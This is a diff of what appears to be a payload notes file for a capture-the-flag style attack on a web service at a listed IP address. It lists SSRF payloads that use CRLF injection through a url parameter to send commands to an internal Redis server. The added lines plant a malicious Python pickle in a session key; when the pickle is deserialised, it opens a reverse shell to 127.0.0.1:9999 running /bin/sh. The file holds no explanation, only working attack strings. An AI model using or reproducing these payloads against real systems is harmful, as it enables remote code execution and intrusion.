@@ -3,4 +3,9 @@ https://140.112.90.54:10163/
 url=http://redis:6379/
 url=http://redis:6379/HTTP/1.1\r\nSET yy yyyy\r\nHeader2:\r\n
 url=http://redis:6379/?q=HTTP/1.1%0d%0aSET yy yyyy%0d%0aHeader2:%0d%0a
-	
+url=http://redis:6379/?q=HTTP/1.1%0d%0aSET session:469ce4a7-1c1c-484a-b56e-4f1180c335c3 "\x80\x04\x95\xfa\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\xdfpython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'\x94\x85\x94R\x94." %0d%0aHeader2:%0d%0a
+
+
+
+b'\x80\x04\x95\xfa\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\xdfpython -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'\x94\x85\x94R\x94.'
+
